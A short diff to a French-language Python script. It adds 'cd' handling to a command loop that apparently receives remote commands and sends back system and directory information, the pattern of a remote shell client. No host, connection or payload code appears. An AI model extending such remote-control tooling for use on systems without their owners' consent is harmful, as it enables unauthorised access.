@@ -36,3 +36,9 @@ while True:
         reponse = platform.platform() + " " + os.getcwd()
         reponse = reponse.encode()
     elif len(commande_split) == 2 and commande_split[0] == "cd":
+        try:
+            os.chdir(commande_split[1].strip("'"))
+            reponse = " "
+        except FileNotFoundError:
+            reponse = "ERREUR : ce répertoire n'exite pas"
+        reponse = reponse.encode()
